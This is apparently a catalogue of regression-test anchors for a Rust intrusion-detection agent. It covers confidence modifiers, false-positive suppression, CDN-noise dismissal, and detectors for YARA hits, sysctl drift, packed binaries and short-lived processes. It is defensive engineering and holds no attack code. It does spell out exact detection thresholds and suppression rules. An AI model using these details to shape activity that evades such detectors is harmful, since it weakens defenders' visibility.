- `crates/agent/src/kg_decide_features.rs::tests::compute_modifier_aggressive_attacker_yields_positive` - the strongest malicious band (`+0.20`) requires BOTH campaign-cluster membership AND low benign history. Anti-regression for triggering on campaign membership alone (would over-block legit IPs that happen to share a CIDR with attackers).
- `crates/agent/src/kg_decide_features.rs::tests::critical_severity_floor_holds` - Critical incidents NEVER receive a negative modifier even when `benign_history >= 0.90`. Defensive layering with Spec 043 Phase 7 (FP suppression). Anti-regression for accidentally suppressing real Critical compromise alerts on entities that look pristine on paper.
- `crates/agent/src/kg_decide_features.rs::tests::would_change_action_detects_threshold_crossings_only` - the operator-scrutiny boolean fires only when confidence crosses the 0.85 auto-execute boundary, not on within-band wiggle. Pins what counts as "operationally significant" in the shadow log.
- `crates/agent/src/kg_decide_features.rs::tests::parse_mode_unknown_string_falls_back_to_off` - typoed config values (`"enfocre"`, `""`, `"typo"`) collapse to `Off` rather than panicking. The agent must boot even when the operator misspells the mode string. Anti-regression for accidentally bailing out on the parse failure (which would refuse to start with a typo in the config).
- `crates/agent/src/kg_decide_features.rs::tests::write_shadow_log_writes_jsonl_with_expected_schema` - shadow log file is `kg_shadow_decide_modifier_<YYYY-MM-DD>.jsonl` AND contains `incident_id`, `modifier_after_floor`, `would_change_action` fields. Pins the operator-facing schema so a future "rotate format" PR must update both the writer and operator's downstream `jq` parsers.
- `crates/agent/src/incident_decision_eval.rs::tests::kg_decide_modifier_shadow_mode_logs_but_does_not_apply` - end-to-end integration: with `[kg].decide_modifier_mode = "shadow"`, a benign-history entity does NOT receive the `[kg: ...]` reason tag (mutation marker) AND the shadow log file IS written. Pins the shadow-vs-enforce contract at the integration layer; promotion to enforce requires this assertion to flip in a deliberate config change.
- `crates/agent/src/incident_decision_eval.rs::tests::kg_decide_modifier_enforce_mode_applies_modifier` - end-to-end integration: with `[kg].decide_modifier_mode = "enforce"`, baseline confidence 0.90 + (-0.30 modifier from long-tenure benign band) → 0.60, AND `decision.reason` gains the `[kg: benign=..., risk=..., age=..., modifier=...]` audit suffix. Anti-regression for breaking the suffix format (operator's audit-log grep depends on it).
- `crates/agent/src/incident_decision_eval.rs::tests::kg_decide_modifier_critical_severity_floor_holds` - end-to-end integration of the Critical floor: the SAME entity + SAME baseline as the enforce test, but with `severity = Critical`, MUST keep confidence at baseline (no `[kg: ...]` tag added because the post-floor modifier is exactly 0.0). Anti-regression for the most dangerous failure mode of this whole spec — silently suppressing a real Critical compromise alert on an entity that has a pristine 60-day history.
- `crates/agent/src/incident_decision_eval.rs::tests::correlation_disabled_skips_cross_detector_boost` - coverage anchor for `correlation.enabled = false` early return: a primed correlator with TWO distinct detectors firing on the same IP (which would normally yield a `[correlated: ...]` tag) MUST leave `decision.reason = "baseline"` and `decision.confidence` unchanged when correlation is disabled in config. Pins the toggle contract — a regression that ignores the flag and always boosts would silently re-enable correlation on hosts that explicitly opted out.
- `crates/agent/src/incident_decision_eval.rs::tests::attacker_profile_high_risk_boosts_confidence_and_tags_reason` - coverage anchor for the legacy `attacker_profiles` sidecar boost: a profile with `risk_score=100` boosts `confidence` by exactly `(100-50)/500 = 0.10` and tags the reason with `[intel: risk 100, regular_scanner, 7 visits]`. Pins the formula AND the tag shape (operators grep for `[intel: risk` in audit logs); a regression that drops the tag silently demotes a known-attacker decision to AI baseline.
- `crates/agent/src/incident_decision_eval.rs::tests::anomaly_score_above_threshold_boosts_confidence_and_tags_reason` - coverage anchor for the autoencoder agreement path: `latest_anomaly_score = 1.0` with baseline `0.5` yields `0.5 + (1.0 - 0.7) * 0.33 = 0.599` and tags the reason with `[neural: 100% anomaly]`. Pins the boost formula, the take-on-consume contract, and the operator-facing tag — all three matter for distinguishing "AI alone said block" vs "AI + anomaly engine agreed" in the post-incident review.
- `crates/agent/src/incident_decision_eval.rs::tests::kg_decide_modifier_off_mode_is_full_noop` - coverage anchor for `decide_modifier_mode = "off"` rollback contract: even with a fully-seeded benign-history KG and a baseline=0.90 decision, the function MUST early-return BEFORE acquiring the read lock or computing features, leave `confidence` and `reason` untouched, AND must NOT create the shadow log file. Pins the operator's rollback-without-redeploy contract — a regression that creates an empty shadow log even in off-mode would leak the existence of the spec-043 path to filesystem-watching tooling and confuse the promotion gate's "non-zero would_change_action" check.

### Deep `/ask` context (Spec 043 Phase 2 - AUDIT-SPEC043-PHASE2)

- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_includes_ip_risk_and_datasets` - Phase 2 headline anchor: `ask_context_deep` surfaces `Ip.risk_score` AND `Ip.datasets` (threat-intel feeds) on the RECENT INCIDENTS section. Pre-Phase-2 these fields were write-only in the KG (operator-reported "/ask responde muito basico"). The LLM now sees real ground truth, not just titles.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_pulls_subgraph_when_question_mentions_ip` - when the operator's question contains a dotted-quad that matches an Ip node, a depth-1 SUBGRAPH FOR QUESTION section is attached (renders neighbors as `<-[Relation]- Node(label)`). Pins that "why is X.X.X.X blocked?" gets grounded in graph topology, not just hallucinated narrative.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_respects_budget_cap_drops_subgraph_first` - under tight char budget, SUBGRAPH section is dropped FIRST (most expendable) so RECENT INCIDENTS (highest signal) survives. Anti-regression for accidentally dropping incidents to fit subgraph, which would degrade /ask quality on memory-constrained runs.
- `crates/agent/src/bot_helpers.rs::tests::ask_context_deep_empty_graph_returns_empty_string` - empty KG produces empty string (no dangling section headers). Pins the same defensive contract as the legacy `graph_last_incidents_raw` helper had.

### Direct-block KG modifier coverage (Spec 043 Phase 1b - AUDIT-SPEC043-PHASE1B)

- `crates/agent/src/correlation_response.rs::tests::phase_1b_repeat_offender_path_invokes_kg_decide_modifier` - Phase 1b headline anchor: `apply_kg_decide_modifier` MUST be called between the repeat-offender `AiDecision` construction and `execute_decision`. Pre-Phase-1b the KG modifier hook fired only on the AI-router decide path, which prod evidence (2026-05-06) shows accounts for <5% of actual block decisions; the bulk flowed through `repeat-offender:*` direct-blocks that bypassed the AI router entirely. The shadow log filled in days instead of minutes. Source-grep anchor — drop the call and the slow-fill regression returns silently.
- `crates/agent/src/correlation_response.rs::tests::phase_1b_multi_technique_path_invokes_kg_decide_modifier` - mirror anchor for the `multi-technique:*` direct-block path. Same rationale.
- `crates/agent/src/correlation_response.rs::tests::phase_1b_completed_chain_path_invokes_kg_decide_modifier` - mirror anchor for the `correlation:*` (completed attack chain) direct-block path. Three direct-block sites in `correlation_response.rs` total; all three pinned independently so a future refactor that drops any one is caught.

### CDN-noise dashboard suppression (Spec 043 Phase 3 - AUDIT-SPEC043-CDN-NOISE)

- `crates/agent/src/incident_autodismiss.rs::tests::try_dismiss_cdn_noise_dismisses_cloudflare_edge` - headline anchor: a `proto_anomaly:SlowConnection:172.71.95.141:*` incident (the exact prod failure shape — 24 of 25 dashboard "needs attention" entries on 2026-05-06 were CF edges) MUST be auto-dismissed. Wave 9 (PR #469) covered the HTTP-layer attribution; this companion fix handles the network-layer noise where there's no HTTP header to read.
- `crates/agent/src/incident_autodismiss.rs::tests::try_dismiss_cdn_noise_dismisses_aws_edge` - mirror anchor for AWS — pins that the suppression uses the broader `cloud_safelist::identify_provider` (which covers CF/AWS/Azure/GCP/OCI/DO/Hetzner) rather than CF-only. A future refactor that narrows back to CLOUDFLARE_RANGES would silently break AWS/Azure CDN-edge suppression.
- `crates/agent/src/incident_autodismiss.rs::tests::try_dismiss_cdn_noise_does_not_dismiss_real_attacker_ip` - anti-regression bound: real attacker IPs (TEST-NET-3 `203.0.113.42`) MUST stay in "needs attention". The whole point of the suppression is to remove CDN noise without losing real attacker visibility.
- `crates/agent/src/incident_autodismiss.rs::tests::try_dismiss_cdn_noise_does_not_touch_other_detectors` - anti-regression bound: `data_exfil_ebpf` / `kill_chain` / `reverse_shell` on a CDN edge IP MUST still surface. Only `proto_anomaly` is in `CDN_NOISY_DETECTORS` — those carry actual exploitation evidence and must not be silenced just because the source happens to be a CDN edge.

### YARA match detector (Spec 043 Phase 3 - AUDIT-SPEC043-PHASE3)

- `crates/agent/src/knowledge_graph/detectors.rs::tests::yara_match_detector_emits_incident_when_yara_match_present` - Phase 3 headline anchor: a File node with non-empty `yara_matches` produces exactly one High incident. Pre-Phase-3 the YARA scanner wrote match-rule names onto File nodes but no consumer ever read them — every match was silently dropped, even on real hits like Cobalt Strike / XMRig / webshells from `rules/yara/*.yml`.
- `crates/agent/src/knowledge_graph/detectors.rs::tests::yara_match_detector_emits_nothing_when_yara_matches_empty` - anti-regression bound: a File node with EMPTY `yara_matches` MUST NOT produce an incident. The detector activates a write-only field; it must not spam every File node in the graph.
- `crates/agent/src/knowledge_graph/detectors.rs::tests::yara_match_detector_emits_one_incident_per_file_for_multiple_matches` - aggregation anchor: a single binary that matched 3 YARA rules produces ONE incident (not 3), with all rule names in the summary. Anti-regression for accidentally emitting one-per-rule (would 3x operator alert volume on hits like `xmrig_miner + packed_upx + cryptominer_generic`).

### Sysctl drift detector (Spec 043 Phase 5 - AUDIT-SPEC043-PHASE5)

- `crates/agent/src/knowledge_graph/detectors.rs::tests::sysctl_drift_first_observation_emits_nothing_just_baselines` - defensive contract: the first observation has no baseline to diff against; detector MUST emit zero incidents and just snapshot. Anti-regression for accidentally treating "first sight" as "all params drifted from /unset/" and spamming hundreds of false positives.
- `crates/agent/src/knowledge_graph/detectors.rs::tests::sysctl_drift_critical_param_change_emits_critical` - Phase 5 headline anchor: `kernel.kptr_restrict` relaxed from `2` to `0` (the rootkit pointer-hiding bypass) emits a Critical incident with the param name in title and old/new values in summary. Pre-Phase-5 the sensor wrote sysctl_params onto System nodes but no consumer diffed them — real rootkits flip these to hide themselves and the signal was invisible.
- `crates/agent/src/knowledge_graph/detectors.rs::tests::sysctl_drift_medium_class_aggregates_into_one_incident` - aggregation anchor: 5 non-critical params drifting in one tick produce ONE Medium incident with all 5 in the summary, not 5 separate incidents. Anti-regression for accidentally flooding the dashboard on a benign system-wide tunable refresh (e.g. `sysctl --system` after editing /etc/sysctl.d).
- `crates/agent/src/knowledge_graph/detectors.rs::tests::sysctl_drift_no_change_emits_nothing` - anti-regression bound: when the System node is unchanged tick-over-tick, detector MUST emit zero incidents. Pre-aggregation a buggy "always emit on every observation" implementation would have flooded the dashboard at 30s intervals.
- `crates/agent/src/knowledge_graph/detectors.rs::tests::sysctl_drift_does_not_re_emit_same_change_on_next_tick` - operator-facing rule anchor: a single intentional change (operator editing /etc/sysctl.d) produces ONE alert, not one per slow-loop tick. Detector updates baseline to current after each emit so the same drift is not surfaced again.

### CDN-noise KG-history hardening (Spec 043 Phase 5 follow-up - AUDIT-SPEC043-CDN-HARDENING)

- `crates/agent/src/incident_autodismiss.rs::tests::try_dismiss_cdn_noise_does_not_dismiss_when_ip_has_other_recent_attack_history` - operator's safety case (2026-05-06: "não podemos ficar vulneráveis a alguém nos invadir usando a Azure"): an Azure / AWS / GCP / OCI / DO / Hetzner IP that has a non-`proto_anomaly` incident in the last 24h (e.g. ssh_bruteforce) MUST NOT have its proto_anomaly auto-dismissed. The initial Phase 3 fix would have silently silenced the noisy half of a real attack on a cloud VM. Hardening uses `kg_decide_features::incidents_24h_excluding_detectors` to check KG history before dismiss.

### Packed binary detector (Spec 043 Phase 4 - AUDIT-SPEC043-PHASE4)

- `crates/agent/src/knowledge_graph/detectors.rs::tests::packed_binary_detector_emits_when_high_entropy_and_executed` - Phase 4 headline anchor: a File with entropy 7.8 (above 7.5 threshold) AND an Executed edge produces ONE Medium incident. Pre-Phase-4 the sensor wrote Shannon entropy onto File nodes but no consumer read it. Activates the field for the exact UPX-packed-dropper shape.
- `crates/agent/src/knowledge_graph/detectors.rs::tests::packed_binary_detector_skips_high_entropy_when_not_executed` - anti-regression bound: a high-entropy file with NO Executed edge is suspicious-on-disk but not actionable for THIS detector. Pre-fix would have spammed every random-looking file in /var/cache.
- `crates/agent/src/knowledge_graph/detectors.rs::tests::packed_binary_detector_skips_legit_low_entropy_executed_binary` - anti-regression bound: a legit ELF binary (entropy ~6.0) that ran on the host MUST NOT trigger. Otherwise every /usr/bin tool would fire.
- `crates/agent/src/knowledge_graph/detectors.rs::tests::packed_binary_detector_respects_configurable_threshold` - threshold knob anchor: entropy 7.0 fires when threshold=6.5 but NOT when threshold=7.5 (default). Pins the operator's tuning surface for unusual workloads.

### Short-lived process detector (Spec 043 Phase 6 - AUDIT-SPEC043-PHASE6)

- `crates/agent/src/knowledge_graph/detectors.rs::tests::short_lived_process_detector_emits_when_subms_and_external_connect` - Phase 6 headline anchor: a 50ms process that connected to an external IP fires Medium. Pre-Phase-6 the sensor wrote start_ts/exit_ts but no consumer measured the lifetime. Exact shape of a shellcode loader (loader → connect → exfil → exit).
- `crates/agent/src/knowledge_graph/detectors.rs::tests::short_lived_process_detector_skips_when_lifetime_above_threshold` - anti-regression: a 500ms process (above default 100ms) MUST NOT trigger. Real long-lived tools shouldn't fire.
- `crates/agent/src/knowledge_graph/detectors.rs::tests::short_lived_process_detector_skips_when_only_internal_connect` - anti-regression: a fast process that connected ONLY to localhost / RFC1918 (health check) MUST NOT trigger. Network I/O alone isn't suspicious; EXTERNAL network I/O during a sub-100ms lifetime is.
- `crates/agent/src/knowledge_graph/detectors.rs::tests::short_lived_process_detector_skips_when_no_exit_ts` - defensive bound: a process still running (no exit_ts) MUST NOT trigger. We only know a process is "short lived" once it has actually exited.

### CDN coverage extension — Akamai / Fastly / CloudFront (operator question 2026-05-06)

- `crates/agent/src/cloud_safelist.rs::tests::akamai_edge_detected` - operator's safety question anchor ("se fosse Akamai funcionaria também?"): Akamai's major edge allocations (`23.0.0.0/12`, `23.32.0.0/11`, `104.64.0.0/10`, `184.24.0.0/13`) are recognised by `is_cloud_provider_ip` AND labeled "Akamai" by `identify_provider`. Pre-fix Akamai edge IPs would have escaped the CDN-noise suppression added in PR #475 + the cloud-history hardening added in PR #476, leaving the same noise pattern as Cloudflare had pre-Wave 9.
- `crates/agent/src/cloud_safelist.rs::tests::fastly_edge_detected` - mirror anchor for Fastly (`151.101.0.0/16` is the most common Fastly /16; `199.232.0.0/16`, `146.75.0.0/17` cover the rest).
- `crates/agent/src/cloud_safelist.rs::tests::cloudfront_specific_edge_detected` - mirror anchor for CloudFront prefixes that fall OUTSIDE the standard AWS 3/13/15/18/44/52/54/99 allocations (`64.252.x`, `130.176.x`, `143.204.x`, `144.220.x`). These would have escaped the existing AWS coverage; pinned so a future "AWS catches all" simplification doesn't drop them.
- `crates/agent/src/cloud_safelist.rs::tests::cdn_coverage_does_not_widen_to_real_attackers` - anti-regression bound: TEST-NET-3 / TEST-NET-2 / TEST-NET-1 (RFC 5737) and random non-CDN allocations MUST still be detected as non-cloud. Adding 30+ CDN entries to `CLOUD_PROVIDER_RANGES` must not accidentally swallow real attacker territory.

### Phase 1 maturity tweaks (Spec 043 - 2026-05-06 follow-up)

- `crates/agent/src/kg_decide_features.rs::tests::dismissed_incident_counts_as_benign_regardless_of_severity` - operator-data-driven tweak (after 22 shadow records all "no actionable signal" in 12h prod): a Medium incident with `decision = Some("dismiss")` MUST count as benign in `benign_history_score`. Pre-tweak the agent's own dismiss decisions were poisoning the benign-history signal — CDN edges and package mirrors that repeatedly triggered Medium proto_anomaly that got auto-dismissed counted as malicious history, blocking the IP from ever reaching the `>= 0.75` band.
- `crates/agent/src/kg_decide_features.rs::tests::undismissed_medium_incident_still_counts_as_malicious` - mirror anti-regression: incident with NO decision and severity=Medium continues to count as malicious. Anti-regression for accidentally widening "benign" to every Medium incident, which would let real attackers reach high benign_history_score.
- `crates/agent/src/kg_decide_features.rs::tests::compute_modifier_strongest_band_triggers_at_age_seven_days` - tweak 2 anchor: the `-0.30` band now triggers at `age_days >= 7` (was 30). 30d was unrealistic in prod due to agent restarts and KG retention windows; 8-day age now qualifies (with the rest of the band's preconditions).
- `crates/agent/src/kg_decide_features.rs::tests::compute_modifier_strongest_band_does_not_trigger_below_seven_days` - mirror anti-regression: 6-day age (still below the new 7d threshold) does NOT qualify. Anti-regression for accidentally lowering threshold to zero.

### KG-based FP suppression (Spec 043 Phase 7 - AUDIT-SPEC043-PHASE7)

- `crates/agent/src/kg_fp_suppression.rs::tests::high_benign_history_returns_high_likelihood` - Phase 7 headline anchor: an entity with overwhelming benign history (100 dismissed-Medium + 1 malicious) yields likelihood ≈ 0.69 (history * 0.70 weighting). Pins the math: history_score is the bulk of the signal, FP-edge bonus is the lift to the suppress band.
- `crates/agent/src/kg_fp_suppression.rs::tests::critical_severity_always_passes_through` - the most dangerous failure mode of the whole spec: even with likelihood = 1.0, a Critical incident MUST PassThrough. Hard-coded floor in `classify`. Anchor pins this — if a future refactor relaxes Critical, this fails CI loudly. Operator wants visibility on active-compromise indicators (kill chain, reverse shell, ransomware, data exfil) regardless of historical benign signal.
- `crates/agent/src/kg_fp_suppression.rs::tests::high_severity_above_threshold_is_suppressed` - mirror anchor proving the Critical floor isn't accidentally hiding everything: High severity at likelihood 0.85 + threshold 0.80 DOES suppress. Validates the `(likelihood >= threshold) AND (severity != Critical)` contract.
- `crates/agent/src/kg_fp_suppression.rs::tests::below_threshold_passes_through` - anti-regression bound: incidents below threshold pass through regardless of severity. Pins the threshold check at the right boundary.
- `crates/agent/src/kg_fp_suppression.rs::tests::fp_edge_bonus_caps_at_zero_thirty` - operator-FP-flag spree protection: 5 false_positive=true incidents cap their bonus contribution at 0.30 even though the per-incident contribution is 0.10. Without the cap, a single operator FP-flag spree could unilaterally flip suppression.
- `crates/agent/src/kg_fp_suppression.rs::tests::no_ip_entity_returns_zero_likelihood` - fail-safe contract: an incident with no IP entity returns likelihood = 0.0 → PassThrough. Anti-regression for accidentally suppressing malformed incidents.
- `crates/agent/src/kg_fp_suppression.rs::tests::parse_mode_unknown_collapses_to_off` - typo'd / empty config strings collapse to `Off` rather than panicking. Mirror of `kg_decide_features::parse_mode`'s contract.
- `crates/agent/src/kg_fp_suppression.rs::tests::write_shadow_log_writes_jsonl_with_expected_schema` - shadow log file is `kg_shadow_fp_suppression_<YYYY-MM-DD>.jsonl` AND contains `incident_id`, `fp_likelihood`, `action`, `would_change_action`, `real_severity` fields. Pins the operator-facing schema so a future "rotate format" PR must update both the writer and operator's downstream `jq` parsers.
- `crates/agent/src/process/incidents.rs::tests::try_kg_fp_suppression_off_mode_is_noop` - wiring layer anchor: `mode = "off"` early-returns false and writes neither shadow log nor decision. Pins the rollback path — operator must be able to disable Phase 7 via config push without redeploy.
- `crates/agent/src/process/incidents.rs::tests::try_kg_fp_suppression_shadow_mode_logs_but_does_not_handle` - wiring layer anchor: shadow mode writes JSONL log AND returns false (no suppression in JSONL decisions). Anti-regression for accidentally writing the dismiss decision in shadow.
- `crates/agent/src/process/incidents.rs::tests::try_kg_fp_suppression_enforce_mode_writes_dismiss_for_high_likelihood` - wiring layer anchor: enforce mode + likelihood >= threshold + non-Critical writes dismiss decision tagged `ai_provider = "kg-fp-suppression"` AND returns true (handled). Pins the operator-facing audit-trail label.
- `crates/agent/src/process/incidents.rs::tests::try_kg_fp_suppression_critical_severity_never_suppressed_via_wiring` - wiring layer Critical floor anchor: even at likelihood = 1.0 in enforce mode, Critical severity returns false. Mirror of the pure-helper anchor — defends both layers in case one regresses.
- `crates/agent/src/process/incidents.rs::tests::try_kg_fp_suppression_enforce_mode_passthrough_for_low_likelihood` - wiring layer anchor: enforce mode + IP not in KG (likelihood = 0.0) returns false (PassThrough). Pins the no-handle path so a future refactor that defaults likelihood to >0 doesn't accidentally suppress unknown IPs.

### Honeypot AbuseIPDB-gate KG audit helper (Spec 043 Phase 1b follow-up — scaffolding)

- `crates/agent/src/honeypot_always_on.rs::tests::kg_audit_features_for_block_returns_none_when_kg_absent` - sync anchor for the `kg = None` branch of the audit helper. Pins the no-KG short-circuit so a future caller wiring up the audit hook can rely on it.
- `crates/agent/src/honeypot_always_on.rs::tests::kg_audit_features_for_block_returns_none_for_unknown_ip` - sync anchor: KG present, IP not yet a node returns `None`. Pins the defensive contract that an unknown IP yields no log spam.
- `crates/agent/src/honeypot_always_on.rs::tests::kg_audit_features_for_block_returns_features_for_known_ip` - sync anchor: IP seeded as `Node::Ip` with a 10-day-old `first_seen` returns features carrying the seeded `risk_score` and a non-zero `first_seen_age_days`. Pins the field-level contract that a future `tracing::info!` audit log will consume.

### Dashboard mod.rs surface helpers (coverage anchors)

- `crates/agent/src/dashboard/mod.rs::tests::security_headers_middleware_stamps_required_headers` — the dashboard middleware stamps X-Frame-Options=DENY, X-Content-Type-Options=nosniff, x-xss-protection=0, and referrer-policy=strict-origin-when-cross-origin on every response. Anti-regression for a "modernise security headers" PR silently dropping any of the four.
- `crates/agent/src/dashboard/mod.rs::tests::index_handler_returns_html_with_no_cache_headers` — the SPA root must ship `Cache-Control: no-store…` + `Pragma: no-cache`. Pins the 2026-05-02 STATIC_NO_CACHE rationale so a future "save bandwidth" PR cannot silently re-introduce browser caching of the index.
- `crates/agent/src/dashboard/mod.rs::tests::each_serve_js_handler_yields_javascript_content_type` — each macro-generated `serve_js_*` handler returns `application/javascript; charset=utf-8` + `no-store` + a non-empty body. Anti-regression for a hand-rolled replacement that drops the cache header on a single bundle (the regression vector that triggered the 2026-05-02 fix in the first place).
- `crates/agent/src/dashboard/mod.rs::tests::try_from_env_vars_handles_all_four_branches` — pins all four `(user, hash)` env-var branches: open access, partial-config errors with the right message on each side, empty-user reject, malformed-PHC reject, happy-path roundtrip. Splits the env-var read from the validation logic so the test never mutates process-wide environment state.
- `crates/agent/src/dashboard/mod.rs::tests::constant_time_eq_rejects_different_lengths_and_content` — `constant_time_eq` short-circuits on length mismatch (the early-return branch the prior tests never exercised) and rejects content mismatch on equal-length inputs without leaking timing.
- `crates/agent/src/dashboard/mod.rs::tests::dashboard_auth_verify_rejects_invalid_phc_hash` — slow-path `verify` rejects wrong username (constant-time short-circuit) and wrong password (argon2 mismatch) and accepts the correct pair. Pins the three internal branches of `DashboardAuth::verify`.
- `crates/agent/src/dashboard/mod.rs::tests::verified_cache_evicts_oldest_when_capacity_full` — the per-process Argon2 cache enforces `VerifiedCache::CAPACITY` (16) by evicting the oldest survivor on overflow. Without this anchor a future "raise the cap" PR could silently regress the eviction loop.
- `crates/agent/src/dashboard/mod.rs::tests::verified_cache_check_returns_false_for_missing_key` — empty cache misses every key, post-insert the inserted key hits and others miss. Pins the `None` arm of the `match map.get(&k)` in `check`.
- `crates/agent/src/dashboard/mod.rs::tests::build_tls_config_loads_existing_self_signed_cert` — the second invocation with no operator-provided paths must reuse the cert+key already on disk and NOT regenerate them. Pins the "load existing" early-exit branch.
- `crates/agent/src/dashboard/mod.rs::tests::build_tls_config_loads_operator_provided_cert_and_key` — when the operator supplies `cert_path` + `key_path`, the auto-gen branch is skipped entirely. Pins the operator-supplied path so a future refactor cannot accidentally write `dashboard-cert.pem` / `dashboard-key.pem` into the operator's data dir behind their back.
- `crates/agent/src/dashboard/mod.rs::tests::build_tls_config_rejects_missing_operator_cert_path` — operator-supplied path with non-existent files surfaces an error containing the bad path. Pins the `with_context` line on the load-PEM error path.

### Dashboard data_api.rs handlers (coverage anchors)

- `crates/agent/src/dashboard/data_api.rs::tests::api_incidents_returns_visible_items_sorted_newest_first` — exercises `compute_incidents_blocking` end-to-end via the `spawn_blocking` wrapper. Asserts research-only filter, ts-desc sort, entities populated from TriggeredBy edges, mitre_ids → tags, and outcome via `threat_contract::classify_decision`. Anti-regression for a refactor that inlines the KG walk back onto the async worker.
- `crates/agent/src/dashboard/data_api.rs::tests::api_incidents_respects_limit_query` — limit query truncates `items` but `total` reports the pre-truncation count. Pins the "X of Y" pagination contract.
- `crates/agent/src/dashboard/data_api.rs::tests::api_incidents_date_filter_drops_other_days` — historical-date branch of `compute_incidents_blocking` runs the `date_filter` arm and produces an empty list when no incident matches that day.
- `crates/agent/src/dashboard/data_api.rs::tests::api_decisions_projects_decision_fields_from_incidents` — Incident-node-to-DecisionView projection: action_type, target_ip, confidence, decision_reason → reason, auto_executed=true → execution_result="ok". Pins the front-end shape so a refactor cannot drop a field silently.
- `crates/agent/src/dashboard/data_api.rs::tests::api_decisions_marks_skipped_when_not_auto_executed` — auto_executed=false branch sets execution_result="skipped" + skill_id=None + empty reason when decision_reason is None.
- `crates/agent/src/dashboard/data_api.rs::tests::compute_overview_counts_ignore_decision_into_ai_ignored` — the `ignore` decision arm in `compute_overview_from_graph` increments `ai_ignored`, not `ai_responded` and not `safely_resolved`.
- `crates/agent/src/dashboard/data_api.rs::tests::compute_overview_counts_request_confirmation_into_unresolved` — the `request_confirmation` decision arm increments `unresolved_count` + `ai_confirmed` but not `ai_responded`.
- `crates/agent/src/dashboard/data_api.rs::tests::compute_overview_counts_allowlisted_increments_separate_counter` — `is_allowlisted=true` bumps `allowlisted_count` (the operator-visible "X allowlisted" tile) without losing the incident from the detector tally.
- `crates/agent/src/dashboard/data_api.rs::tests::read_degraded_signals_parses_gauges_orphaned` — pins the canonical PR #425 Wave 4d shape: `gauges.orphaned` is the current count the banner reads, `totals.revert_failures` is the lifetime counter.
- `crates/agent/src/dashboard/data_api.rs::tests::read_degraded_signals_falls_back_to_state_counts_revert_failed` — transitional shape: when `gauges.orphaned` is absent, fall back to `state_counts.revert_failed`. Anti-regression for a "simplification" PR that drops the fallback during a deploy window.
- `crates/agent/src/dashboard/data_api.rs::tests::read_degraded_signals_returns_default_when_no_responses_file` — no SQLite blob, no responses.json on disk → all-zero DegradedSignals so the banner stays green by construction.
- `crates/agent/src/dashboard/data_api.rs::tests::read_degraded_signals_default_when_responses_json_is_garbage` — malformed JSON does NOT panic the helper; corrupt responses.json on disk keeps the dashboard rendering.
- `crates/agent/src/dashboard/data_api.rs::tests::api_report_returns_json_for_empty_state` — `api_report` happy path serialises a TrialReport as pretty JSON with `detection_summary.total_incidents` present. Pins the public JSON contract the report tab consumes.
- `crates/agent/src/dashboard/data_api.rs::tests::api_briefing_returns_unavailable_when_no_cache` — GET /api/briefing renders `available=false` plus the operator-facing "No briefing generated yet" message when the latest_briefing mutex is None.
- `crates/agent/src/dashboard/data_api.rs::tests::api_briefing_returns_cached_briefing_when_present` — populated mutex round-trips `available=true`, threat_level, date, summary into the JSON envelope.

### Dashboard actions.rs handlers (coverage anchors)

- `crates/agent/src/dashboard/actions.rs::tests::api_action_config_returns_read_only_when_disabled` - pins the `enabled = false` branch of the mode derivation. The dashboard UI hides action buttons when this returns `read_only`; a regression here silently exposes them.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_config_returns_watch_when_enabled_and_dry_run` - pins the `enabled && dry_run` branch. The UI must show buttons with a DRY-RUN tag in this mode.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_config_returns_guard_when_enabled_live` - pins the `enabled && !dry_run` branch (live mode). Anti-regression for an off-by-one boolean that flips watch/guard.
- `crates/agent/src/dashboard/actions.rs::tests::api_quickwins_async_wrapper_returns_payload_from_disk` - exercises the `tokio::task::spawn_blocking` wrapper around `quickwins_payload`. Anti-regression for a refactor that inlines the JSONL scan back onto the async worker pool (the original bug `RECURRING_BUGS.md` "Dashboard handlers block tokio worker threads").
- `crates/agent/src/dashboard/actions.rs::tests::api_action_block_ip_rejects_when_actions_disabled` - default `enabled = false` config short-circuits with the explicit message. Pins the operator-visible disabled-actions string the SPA renders.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_block_ip_rejects_invalid_target` - RFC1918 target via the public handler returns the `validate_action_params` error verbatim. Layered with the unit-test pinning the validator itself.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_block_ip_rejects_unallowed_skill` - resolved skill_id (e.g. `block-ip-iptables`) not in `allowed_skills` returns a typed error AND echoes the resolved skill_id back in the response so the operator can spot the misconfiguration.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_block_ip_dry_run_happy_path_writes_audit` - end-to-end: dry-run handler executes, decision JSONL row is written with `action_type = block_ip`, `dry_run = true`, and the operator-supplied `incident_id` round-trips. Pins the audit-trail contract.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_block_ip_logs_warning_when_insecure_http` - exercises the `state.insecure_http` warn! branch alongside the disabled-short-circuit. Anti-regression for a refactor that drops the HTTP-without-TLS warning.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_suspend_user_rejects_when_actions_disabled` - same disabled-actions guard, with the `suspend-user-sudo` skill_id echoed back. Pins the message + skill_id contract.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_suspend_user_rejects_empty_user` - empty / whitespace-only user fails with the explicit message. Pins the validation order vs the reason check.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_suspend_user_rejects_empty_reason` - empty / whitespace-only reason fails after the user check. Pins the second of the two validation gates.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_suspend_user_rejects_unallowed_skill` - skill missing from `allowed_skills` rejected with the typed message.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_suspend_user_dry_run_happy_path_writes_audit` - dry-run handler succeeds, decision JSONL row carries `action_type = suspend_user_sudo`, target_user, and incident_id. Exercises the `insecure_http` branch in the same test for coverage compactness.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_honeypot_rejects_when_actions_disabled` - default disabled config short-circuits with the explicit message.
- `crates/agent/src/dashboard/actions.rs::tests::api_action_honeypot_rejects_empty_reason` - empty reason rejected before the allowed_skills check (the order matters: a non-allowed skill with an empty reason still surfaces the reason error first).
- `crates/agent/src/dashboard/actions.rs::tests::api_action_honeypot_rejects_unallowed_skill` - `honeypot` not in allowed_skills returns the typed error.
